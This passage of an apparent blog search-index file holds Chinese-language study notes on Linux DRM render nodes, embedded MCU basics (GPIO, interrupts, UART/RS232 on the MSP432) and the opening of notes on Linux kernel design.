rate\u2014that is within the range of values supported by itself and the attached\u00a0display screen.</li> <li>KMS has been adopted to such an extent that certain drivers which lack 3D acceleration (or for which the hardware vendor doesn't want to expose or implement it) nevertheless implement the KMS API without the rest of the DRM API, allowing display servers (like\u00a0Wayland) to run with ease.[47]</li> </ul> </li> </ul> <p>render node\uff1a\u5c06\u8ba1\u7b97\u548c\u6e32\u67d3\u7684\u90e8\u5206\u5265\u79bb\u5f00\u6765\uff0c\u907f\u514d\u53ea\u6709\u7279\u6743\u7528\u6237\u624d\u80fd\u8bbf\u95eegpu\u3002 The \"render nodes\" concept tries to solve these scenarios by splitting the DRM user space API into two interfaces \u2013 one privileged and one non-privileged \u2013 and using separate device files (or \"nodes\") for each one.\u00a0For every GPU found, its corresponding DRM driver\u2014if it supports the render nodes feature\u2014creates a device file\u00a0<code>/dev/dri/renderD_X_</code>, called the\u00a0render node, in addition to the primary node\u00a0<code>/dev/dri/card_X_</code></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u786c\u4ef6\u652f\u6301","title":"\u786c\u4ef6\u652f\u6301","text":"<p>\u5c55\u793a\u4e86AMD\u7684\u4e24\u5957\u9a71\u52a8\uff1aMesa\u548cAMD\u81ea\u8eab\u7684 </p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/","title":"\u5d4c\u5165\u5f0f\u6280\u672f\u57fa\u7840\u4e0e\u5b9e\u8df5 \u7b2c\u4e94\u7248","text":"","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u5fc3\u5f97","title":"\u5fc3\u5f97","text":"<ol> <li> <p>\u4e3a\u4ec0\u4e48\u5355\u7247\u673a\u53ef\u4ee5\u63a7\u5236\u706f\u7684\u4eae\u706d\uff0c\u901a\u7528 PC \u5374\u6ca1\u529e\u6cd5\u63a7\u5236\u706f\u5462\uff1f\uff08\u56e0\u4e3a\u6ca1\u6709 CPU \u5230 LED \u7684\u63a5\u53e3\u4e5f\u6ca1\u6709\u9a71\u52a8\u7a0b\u5e8f\uff09</p> </li> <li> <p>\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u548c MIPS \u91c7\u7528\u7684\u7edf\u4e00\u5165\u53e3\u5730\u5740\u4e0d\u592a\u4e00\u6837\u3002\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u786c\u4ef6\u4ea7\u751f\u4e2d\u65ad\u8bf7\u6c42\u65f6\uff0c\u4e2d\u65ad\u53f7\u662f\u786e\u5b9a\u4e86\u7684\uff08\u901a\u8fc7\u4e2d\u65ad\u63a7\u5236\u5668\u53d1\u9001\u4e2d\u65ad\u53f7\uff09\uff0c\u8f6f\u4ef6\u53ef\u4ee5\u914d\u7f6e\u5bf9\u5e94\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u3002\u800c MIPS \u6ca1\u6709\u4e2d\u65ad\u53f7\u7684\u6982\u5ff5\uff0c\u901a\u8fc7\u8f6f\u4ef6\u68c0\u67e5 Stastus \u5bc4\u5b58\u5668\uff0c\u6765\u786e\u5b9a\u662f\u54ea\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u3002</p> <p>\u4e2d\u65ad\u5411\u91cf\u673a\u5236\u7684 CPU \u901a\u5e38\u9700\u8981\u4e00\u4e2a\u4e2d\u65ad\u63a7\u5236\u5668\uff0c\u8fde\u63a5\u5728\u603b\u7ebf\u4e0a\u3002\u4e2d\u65ad\u63a7\u5236\u5668\u4f1a\u7ed9 CPU \u63d0\u4f9b\u4e2d\u65ad\u53f7\u3002</p> </li> <li> <p>MCU \u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u5fae\u578b\u8ba1\u7b97\u673a\uff0c\u5305\u542b CPU\uff0c\u5b58\u50a8\u5668\uff0cI/O \u63a5\u53e3\uff08\u63a7\u5236\u5668\u6a21\u5757\uff09\u3002\u5d4c\u5165\u5f0f\u5f00\u53d1\u5c31\u662f\u8981\u57fa\u4e8e MCU \u642d\u5efa\u4e00\u4e2a\u786c\u4ef6\u7cfb\u7edf\uff08\u901a\u8fc7 MCU \u7684 I/O \u63a5\u53e3\u8fde\u63a5\u5404\u79cd\u9700\u8981\u88ab\u63a7\u5236\u7684\u5916\u8bbe\uff09\uff0c\u5e76\u9010\u5c42\u5411\u4e0a\u7f16\u5199\u6784\u4ef6\uff08\u9a71\u52a8\uff09\uff0c\u6700\u540e\u57fa\u4e8e\u6784\u4ef6\u7f16\u5199\u5d4c\u5165\u5f0f\u5e94\u7528\uff0c\u4ece\u800c\u5b8c\u6210\u9700\u8981\u7684\u529f\u80fd\u3002</p> </li> <li> <p>MCU \u7531\u4e8e\u9700\u8981\u901a\u7528\u6027\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u57fa\u4e8e MCU \u53bb\u642d\u5efa\u81ea\u5df1\u7684\u7cfb\u7edf\uff0c\u9a71\u52a8\u81ea\u5df1\u7684\u5916\u8bbe\uff0c\u56e0\u6b64\u6bcf\u4e2a\u5f15\u811a\u90fd\u590d\u7528\u591a\u4e2a\u529f\u80fd\u3002\u901a\u8fc7\u914d\u7f6e MCU \u5185\u5bf9\u5e94\u63a7\u5236\u5668\u7684\u5bc4\u5b58\u5668\u6765\u914d\u7f6e\u5f15\u811a\u7684\u529f\u80fd\u3002</p> <p>\u6bd4\u5982 MSP432 100 \u4e2a\u5f15\u811a\u4e2d\u6709 84 \u4e2a\u53ef\u4ee5\u914d\u7f6e\u6210 GPIO \u5f15\u811a\u3002\u53ea\u9700\u8981\u5c06 MSP432 \u5206\u914d\u7684 GPIO \u5bc4\u5b58\u5668\u4e2d\u7684 PxSEL0, PxSEL1 \u5bc4\u5b58\u5668\uff08x \u8868\u793a\u7aef\u53e3\u53f7\uff0c\u6709 11 \u4e2a\u7aef\u53e3 P1~P10 \u548c PJ\uff09\u90fd\u7f6e\u4e3a 0 \u65f6\uff0c\u8be5\u7aef\u53e3\u7684\u5f15\u811a\u5373\u4e3a GPIO \u529f\u80fd\u3002\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e GPIO \u5bc4\u5b58\u5668\u63a7\u5236\u5f15\u811a\u65b9\u5411\u4f5c\u4e3a\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\uff0c\u7528\u4e8e\u70b9\u4eae LED \u706f\u6216\u8005\u63a5\u53d7\u5f00\u5173\u8f93\u5165\u3002</p> <p>\u518d\u6bd4\u5982 MSP432 \u6709 4 \u4e2a\u589e\u5f3a\u578b\u901a\u7528\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\u6a21\u5757 (eUSCI)\uff0c\u4e5f\u5206\u914d\u4e86\u82e5\u5e72\u5bc4\u5b58\u5668\u3002\u901a\u8fc7\u914d\u7f6e\u5bc4\u5b58\u5668\u53ef\u4ee5\u5c06\u5bf9\u5e94\u5f15\u811a\u914d\u7f6e\u4e3a UART \u7684\u5f15\u811a\u6216 SPI \u7684\u5f15\u811a\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u5728 FPGA \u4e0a\u642d\u5efa SoC \u65f6\uff0c\u5f00\u53d1\u677f\u4e0a\u7684\u706f\u3001\u62e8\u7801\u5f00\u5173\u548c FGPA \u82af\u7247\u7684\u5f15\u811a\u662f\u8fde\u597d\u4e86\u7684\uff08\u7531\u5f00\u53d1\u677f\u7684\u63d0\u4f9b\u5546\u57fa\u4e8e FPGA \u82af\u7247\u642d\u5efa\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u6bcf\u4e2a\u5f15\u811a\u4f5c\u4e3a\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\u662f\u5df2\u7ecf\u786e\u5b9a\u4e86\u7684\u3002\u6211\u4eec\u80fd\u6539\u53d8\u7684\u53ea\u662f\u2014\u2014\u662f\u5426\u4f7f\u7528\u8be5\u5916\u8bbe\u3002\u5f53\u7136\uff0c\u4e0d\u6392\u9664\u4fdd\u7559\u4e86\u4e00\u4e9b\u5f15\u811a\u88ab\u63a5\u5230\u6269\u5c55\u63d2\u53e3\u4e0a\uff08\u90a3\u4e00\u6392\u6392\u7684\u9ed1\u8272\u63d2\u5b54\uff09\u3002\u56e0\u6b64\u5728 FPGA \u4e0a\u642d\u5efa SoC \u540e\uff0c\u5b9e\u73b0\u5916\u8bbe\u9a71\u52a8\u9700\u8981\u5bf9\u5916\u8bbe\u7684\u63a7\u5236\u5668\u8fdb\u884c\u914d\u7f6e\u3002\u800c\u5d4c\u5165\u5f0f\u5f00\u53d1\u8fd8\u591a\u51fa\u4e86\u914d\u7f6e MCU \u5185\u7528\u4e8e\u590d\u7528\u7684\u6a21\u5757\u5bc4\u5b58\u5668\u3002</p> </li> </ol> <ul> <li>\u5d4c\u5165\u5f0f\u6280\u672f\u57fa\u7840\u4e0e\u5b9e\u8df5 \u7b2c\u4e94\u7248<ul> <li>\u5fc3\u5f97</li> <li>\u7b2c\u4e00\u7ae0\uff1a\u6982\u8ff0</li> <li>\u7b2c\u4e8c\u7ae0\uff1aARM Cortex-M4F \u5904\u7406\u5668</li> <li>\u7b2c\u4e09\u7ae0\uff1a\u5b58\u50a8\u6620\u50cf\u3001\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf</li> <li>\u7b2c\u56db\u7ae0\uff1aGPIO \u53ca\u7a0b\u5e8f\u6846\u67b6</li> <li>\u7b2c\u4e94\u7ae0\uff1a\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303</li> <li>\u7b2c\u516d\u7ae0\uff1a\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784</li> </ul> </li> </ul>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e00\u7ae0\u6982\u8ff0","title":"\u7b2c\u4e00\u7ae0\uff1a\u6982\u8ff0","text":"<ol> <li> <p>\u5728 MCU \u51fa\u73b0\u4e4b\u524d\uff0c\u4eba\u4eec\u5fc5\u987b\u4f7f\u7528\u6a21\u62df\u7535\u8def\u3001\u6570\u5b57\u7535\u8def\u5b9e\u73b0\u6d4b\u63a7\u7cfb\u7edf\u4e2d\u7684\u5927\u90e8\u5206\u8ba1\u7b97\u4e0e\u63a7\u5236\u529f\u80fd\u3002</p> <p>\u5728 MCU \u51fa\u73b0\u540e\uff0c\u8ba1\u7b97\u4e0e\u63a7\u5236\u7531\u8f6f\u4ef6\u5b9e\u73b0\uff0c\u5176\u5b83\u7535\u5b50\u7ebf\u8def\u6210\u4e3a MCU \u7684\u5916\u56f4\u7535\u8def\uff0c\u627f\u62c5\u8f93\u5165\u3001\u8f93\u51fa\u4e0e\u6267\u884c\u52a8\u4f5c\u7b49\u529f\u80fd\u3002</p> </li> <li> <p>\u5e38\u7528\u672f\u8bed</p> <ol> <li> <p>\u5c01\u88c5 (Package)\uff0c\u7528\u5851\u6599\u3001\u91d1\u5c5e\u6216\u9676\u74f7\u6750\u6599\u5c06\u96c6\u6210\u7535\u8def\u5c01\u88c5\u5728\u5176\u4e2d\u3002</p> </li> <li> <p>PCB\uff08Printed Circuit Board\uff0c\u5370\u5237\u7535\u8def\u677f\uff09\u3002\u7535\u8def\u539f\u7406\u56fe\u7684\u5b9e\u7269\u5316\uff0c\u5b9e\u73b0\u5404\u5143\u4ef6\u7684\u5e03\u7ebf\u3002</p> </li> <li> <p>\u5e38\u89c1\u5b58\u50a8\u5668\uff1aRAM, ROM, PROM, EPROM, EEPROM, Flash Memory</p> </li> <li> <p>\u51e0\u79cd\u63a5\u53e3\u53d1\u5c55\uff1aUART\uff08\u5f02\u6b65\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\uff0c\u901a\u7528\u5f02\u6b65\u6536\u53d1\u5668\uff0cUniversal Asynchronous Receiver Transmitters\uff09-&gt;SPI\uff08\u4e32\u884c\u5916\u8bbe\u63a5\u53e3\uff0cSerial Peripheral Interface\uff09-&gt;I2C\uff08\u96c6\u6210\u7535\u8def\u4e92\u8054\u603b\u7ebf\uff0cInter-Integrated Circuit\uff09-&gt;USB\uff08\u901a\u7528\u4e32\u884c\u603b\u7ebf\uff0cUniversal Serial Bus\uff09</p> </li> <li> <p>\u8fb9\u754c\u626b\u63cf\u6d4b\u8bd5\u534f\u8bae JTAG\uff08Joint Test Action Group\uff0c\u56fd\u9645\u8054\u5408\u6d4b\u8bd5\u884c\u52a8\u7ec4\uff09\u3002\u5bf9\u82af\u7247\u8fdb\u884c\u6d4b\u8bd5\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u80fd\u591f\u83b7\u53d6\u82af\u7247\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\uff0c\u6216\u6d4b\u8bd5\u5668\u4ef6\u95f4\u5f15\u811a\u7684\u8fde\u63a5\u60c5\u51b5\u3002</p> <p>-&gt; SWD\uff08Serial wire Debug\uff0c\u4e32\u884c\u8c03\u8bd5\u7ebf\uff09\u3002\u4f7f\u7528\u66f4\u5c11\u9488\u811a\uff0c\u662f JTAG \u7684\u9ad8\u6027\u80fd\u66ff\u4ee3\u54c1\u3002</p> </li> <li> <p>RTOS\uff0c\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf</p> </li> <li> <p>\u770b\u95e8\u72d7\uff0c\u7528\u4e8e\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u8dd1\u5206\u3002\u7a0b\u5e8f\u8dd1\u98de\u540e\uff0c\u7531\u4e8e\u65e0\u6cd5\u6e05\u9664\u6389\u770b\u95e8\u72d7\u7684\u8ba1\u65f6\u5668\uff0c\u56e0\u6b64\u4f1a\u5bfc\u81f4 CPU \u590d\u4f4d</p> </li> <li> <p>ISR\uff08\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0cInterrupt Service Routine\uff09</p> </li> </ol> </li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e8c\u7ae0arm-cortex-m4f-\u5904\u7406\u5668","title":"\u7b2c\u4e8c\u7ae0\uff1aARM Cortex-M4F \u5904\u7406\u5668","text":"<ol> <li>ARM Cortex \u5904\u7406\u5668\u5206\u4e3a M\u3001R\u3001A \u7cfb\u5217\u3002A\uff1a\u4ee3\u8868\u5e94\u7528\u5904\u7406\u5668\uff0c\u7528\u4e8e\u624b\u673a\u3002M \u4ee3\u8868\u4f4e\u529f\u8017\u3002</li> <li>ARM v7 \u662f 32 \u4f4d\u6307\u4ee4\u96c6\uff0cARM v8 \u662f 64 \u4f4d\u3002Thumb \u662f ARM \u4e2d\u4e00\u79cd 16 \u4f4d\u6307\u4ee4\u96c6\uff0cThumb2 \u662f 16/32 \u6df7\u5408\u6307\u4ee4\u96c6</li> <li>MSP432 \u662f TI\uff08\u5fb7\u5dde\u4eea\u5668\uff09\u751f\u4ea7\u7684\u57fa\u4e8e Cortex-M4F \u5904\u7406\u5668\u7684\u5fae\u63a7\u5236\u5668</li> <li>ARM \u6c47\u7f16\u53c2\u8003\u300aGUN \u6c47\u7f16\u8bed\u6cd5\u300b</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e09\u7ae0\u5b58\u50a8\u6620\u50cf\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf","title":"\u7b2c\u4e09\u7ae0\uff1a\u5b58\u50a8\u6620\u50cf\u3001\u4e2d\u65ad\u6e90\u4e0e\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf","text":"<ol> <li>MCU \u7684\u5f15\u811a\u5305\u542b\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u4e3a MCU \u63d0\u4f9b\u670d\u52a1\u7684\u5f15\u811a\uff0c\u5982\u7535\u6e90\u3001\u590d\u4f4d\u3001\u6676\u632f\u7b49\u3002\u53e6\u4e00\u7c7b\u662f MCU \u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u7684\u5f15\u811a\uff0c\u4e5f\u79f0\u4e3a I/O \u7aef\u53e3\u8d44\u6e90\u7c7b\u5f15\u811a\u3002</li> <li>MCU \u5185\u90e8\u5305\u542b\uff081\uff09CPU\uff1b\uff082\uff09SRAM\u3001ROM \u548c Flash \u4f5c\u4e3a\u5b58\u50a8\u5668\uff1b\uff083\uff09I/O \u63a5\u53e3\uff08\u63a7\u5236\u5668\uff09\uff0c\u5982 UART, I2C, SPI \u901a\u4fe1\u6a21\u5757\uff0cJTAG \u548c SWD \u7684\u8c03\u8bd5\u63a5\u53e3\u3002</li> <li>MCU \u5df2\u7ecf\u5bf9\u5730\u5740\u7a7a\u95f4\u8fdb\u884c\u4e86\u5206\u914d\u3002\u4e5f\u4e3a\u6bcf\u4e2a\u4e2d\u65ad\u6e90\u5206\u914d\u4e86\u4e2d\u65ad\u53f7\u3002</li> <li>MCU \u7684\u786c\u4ef6\u6700\u5c0f\u7cfb\u7edf\uff08\u57fa\u4e8e MCU \u642d\u5efa\u7684\u6700\u5c0f\u7cfb\u7edf\uff09\u662f\u6307\u53ef\u4f7f\u5185\u90e8\u7a0b\u5e8f\u8fd0\u884c\u7684\u3001\u89c4\u8303\u7684\u3001\u53ef\u590d\u7528\u7684\u6838\u5fc3\u6784\u4ef6\u7cfb\u7edf\u3002\u4e00\u822c\u5305\u542b\uff0c\u7535\u6e90\uff0c\u6676\u632f\uff0c\u590d\u4f4d\uff0c\u5199\u5165\u8c03\u8bd5\u5668\u63a5\u53e3\uff08\u5982 SWD\uff1b\u5c06\u7a0b\u5e8f\u5199\u5165\u82af\u7247\uff09</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u56db\u7ae0gpio-\u53ca\u7a0b\u5e8f\u6846\u67b6","title":"\u7b2c\u56db\u7ae0\uff1aGPIO \u53ca\u7a0b\u5e8f\u6846\u67b6","text":"<ol> <li>\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u7f16\u5199 GPIO \u7684\u6784\u4ef6 (gpio_init(port, pin, IN/OUT, STATUS))\uff0c\u518d\u5728\u6b64\u57fa\u7840\u4e0a\u7f16\u5199\u63a7\u5236\u5c0f\u706f\u7684\u6784\u4ef6 (light_init(port, pin, ON/OFF))\u3002</li> <li>\u5d4c\u5165\u5f0f\u9879\u76ee\u7684\u6807\u51c6\u7ed3\u6784\uff08\u76ee\u5f55\u5206\u7c7b\uff09\uff0cCPU \u6709\u5173\uff0cMCU \u6709\u5173\uff08\u5bc4\u5b58\u5668\u5730\u5740\u6620\u5c04\uff09\uff0c\u7528\u6237\u6784\u5efa\u7684\u7535\u8def\u76f8\u5173 UserBoard\uff08\u5982\u5c06 LED \u706f\u8fde\u63a5\u5230 MCU \u4e0a\uff09\uff0c\u9876\u5c42\u5e94\u7528\u3002</li> <li>\u4ecb\u7ecd\u4e86\u94fe\u63a5\u811a\u672c\u7684\u5185\u5bb9\u542b\u4e49\u3002</li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u4e94\u7ae0\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303","title":"\u7b2c\u4e94\u7ae0\uff1a\u5d4c\u5165\u5f0f\u786c\u4ef6\u6784\u4ef6\u4e0e\u5e95\u5c42\u9a71\u52a8\u6784\u4ef6\u57fa\u672c\u89c4\u8303","text":"<ol> <li>\u786c\u4ef6\u6784\u4ef6\u53ef\u4ee5\u5206\u4e3a\u6838\u5fc3\u6784\u4ef6\uff0c\u4e2d\u95f4\u6784\u4ef6\uff0c\u7ec8\u7aef\u6784\u4ef6\u3002\u6838\u5fc3\u6784\u4ef6\u53ea\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u5982 MCU \u6700\u5c0f\u786c\u4ef6\u7cfb\u7edf\uff0c\u7ec8\u7aef\u6784\u4ef6\u53ea\u5bf9\u5916\u63d0\u51fa\u9700\u6c42\u5982 LED \u6784\u4ef6\u3002</li> <li>\u5d4c\u5165\u5f0f\u8f6f\u4ef6\u6784\u4ef6\uff1a<ul> <li>\u9762\u5411\u82af\u7247\u7ea7\u7684\u786c\u4ef6\u9a71\u52a8\u6784\u4ef6\u3002\u5982 GPIO \u6784\u4ef6\u3002</li> <li>\u9762\u5411\u5b9e\u9645\u5e94\u7528\u786c\u4ef6\u6a21\u5757\u3002\u5982 Light \u6784\u4ef6\u3002</li> <li>\u9762\u5411\u7b97\u6cd5\uff0c\u5982\u94fe\u8868\u3001\u961f\u5217\u3001\u6392\u5e8f\u7b97\u6cd5\u7b49\u3002</li> </ul> </li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2020/01/01/2020-01-01-%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E8%B7%B5/#\u7b2c\u516d\u7ae0\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784","title":"\u7b2c\u516d\u7ae0\uff1a\u4e32\u884c\u901a\u4fe1\u6a21\u5757\u53ca\u7b2c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u7ed3\u6784","text":"<ol> <li> <p>\u4e32\u884c\u901a\u4fe1\u63a5\u53e3\u7b80\u79f0\u4e32\u53e3\uff0cUART \u6216 SCI(serial communication interface)\u3002</p> </li> <li> <p>\u7a7a\u95f2\u72b6\u6001\u662f 1\uff0c\u53d1\u9001\u4e00\u4e2a 0 \u8868\u793a\u4e00\u4e2a\u5b57\u8282\u4f20\u8f93\u5f00\u59cb\uff0c\u968f\u540e\u662f\u5b57\u8282\u6570\u636e\uff0c\u6700\u540e\u662f 1 \u4f4d\u6216 2 \u4f4d\u7684\u505c\u6b62\u4f4d\u3002\u5f00\u59cb\u4f4d\u548c\u505c\u6b62\u4f4d\u5f71\u54cd\u4e86\u4e32\u53e3\u7684\u4f20\u8f93\u901f\u7387\u3002</p> </li> <li> <p>MCU \u8f93\u51fa\u7684\u662f TTL\uff08\u6676\u4f53\u7ba1 - \u6676\u4f53\u7ba1\u903b\u8f91\u7535\u5e73\uff0cTransistor-Transistor Logic\uff09\uff0c1 \u548c 0 \u7684\u7279\u5f81\u7535\u538b\u503c\u662f 2.4V \u548c 0V\u3002\u800c RS232 \u6807\u51c6\u91c7\u7528\u8d1f\u903b\u8f91\uff08\u4e3a\u4e86\u4f20\u8f93\u7684\u66f4\u8fdc\uff09\uff0c-15V \u5230 -3V \u4e3a 1\uff0c+3V \u5230 +15V \u4e3a 0\u3002\u56e0\u6b64\u9700\u8981\u7535\u5e73\u8f6c\u6362\u7535\u8def\u3002</p> </li> <li> <p>9 \u82af\u4e32\u884c\u63a5\u53e3</p> <ul> <li>\u63a5\u6536\u7ebf\u4fe1\u53f7\u68c0\u6d4b</li> </ul> <ul> <li>RxD \u63a5\u6536\u6570\u636e\u7ebf</li> <li>TxD \u53d1\u9001\u6570\u636e\u7ebf</li> <li>DTR \u6570\u636e\u7ec8\u7aef\u51c6\u5907\u5c31\u7eea</li> <li>SG \u4fe1\u53f7\u5730</li> <li>DSR \u6570\u636e\u901a\u4fe1\u8bbe\u5907\u51c6\u5907\u5c31\u7eea</li> <li>RTS \u8bf7\u6c42\u53d1\u9001</li> <li>CTS \u5141\u8bb8\u53d1\u9001</li> <li>\u632f\u94c3\u63d0\u793a</li> </ul> <p>\u5e38\u5e38\u4f7f\u7528\u7cbe\u7b80\u7684 RS232 \u901a\u4fe1\uff0c\u4ec5\u4f7f\u7528 RxD\u3001TxD \u548c SG\u3002\u5176\u5b83\u4e3a\u8fdb\u884c\u8fdc\u7a0b\u4f20\u8f93\u65f6\u63a5\u8c03\u5236\u89e3\u8c03\u5668\u7528\uff0c\u6709\u7684\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u786c\u4ef6\u63e1\u624b\u4fe1\u53f7\uff08\u5982 RTS \u548c CTS\uff09</p> </li> </ol>","tags":["\u5d4c\u5165\u5f0f"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/","title":"linux \u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u9605\u8bfb","text":"<p>linux \u5185\u6838\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff08\u539f\u4e66\u7b2c 3 \u7248\uff09, Robert Love</p> <ul> <li>\u4e00\u4e2a\u5185\u6838\u7531\uff1a\u8d1f\u8d23\u54cd\u5e94\u4e2d\u65ad\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0c\u8d1f\u8d23\u591a\u4e2a\u7a0b\u5e8f\u5206\u4eab\u5904\u7406\u5668\u65f6\u95f4\u7684\u8fdb\u7a0b\u8c03\u5ea6\u7a0b\u5e8f\uff0c\u8d1f\u8d23\u7ba1\u7406\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5b58\u7ba1\u7406\u7a0b\u5e8f\u548c\u7f51\u7edc\u3001\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7b49\u7cfb\u7edf\u670d\u52a1\u7a0b\u5e8f\u7ec4\u6210\u3002</li> </ul> <ul> <li> <p>\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u8bbf\u95ee\u5185\u6838\uff0c\u5185\u6838\u8fd0\u884c\u4e8e\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u3002\uff08\u4e0d\u540c\u8fdb\u7a0b\u8fd0\u884c\u540c\u6837\u7684\u5185\u6838\u4ee3\u7801\uff0c\u4e0a\u4e0b\u6587\u4e0d\u540c\uff0c\u56e0\u6b64\u6709\u4e0d\u540c\u6548\u679c\uff09</p> <ul> <li>\u5bf9\u4e8e\u4e2d\u65ad\u6765\u8bf4\uff0c\u5185\u6838\u8fd0\u884c\u4e8e\u4e2d\u65ad\u4e0a\u4e0b\u6587</li> </ul> </li> </ul> <ul> <li>\u5355\u5185\u6838\u548c\u5fae\u5185\u6838\u3002linux \u6c72\u53d6\u4e86\u5fae\u5185\u6838\u7684\u4f18\u70b9\uff1alinux \u662f\u6a21\u5757\u5316\u7684\uff0c\u591a\u7ebf\u7a0b\u7684\u4ee5\u53ca\u5185\u6838\u672c\u8eab\u53ef\u8c03\u5ea6\u7684\u3002</li> </ul> <ul> <li>inline \u51fd\u6570\u5fc5\u987b\u7528 static \u4fee\u9970\uff0c\u6d89\u53ca\u5230\u7f16\u8bd1\uff0c\u56e0\u4e3a inline \u7684\u542b\u4e49\u6709\u70b9\u50cf\u5b8f\u3002\u800c\u5982\u679c\u4e0d\u7528 static \u4fee\u9970\uff0c\u90a3\u4e48\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u4e5f\u53ef\u4ee5\u8c03\u7528\u5b83\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4e0d\u5f97\u4e0d\u5efa\u7acb\u4e00\u4e2a\u7b26\u53f7\u8868\u9879\u3002\u56e0\u6b64\u58f0\u660e\u4e3a static \u5b9e\u73b0\u8d77\u6765\u66f4\u7b80\u5355\u3002</li> </ul> <ul> <li>\u5185\u6838\u4f7f\u7528\u7684 C \u8bed\u8a00\u7528\u5230\u4e86 ISO99 \u548c GUN C \u6269\u5c55\u7279\u6027\uff0c\u5176\u4e2d\u51e0\u4e2a\u7528\u7684\u6bd4\u8f83\u5e7f\u7684 GUN C 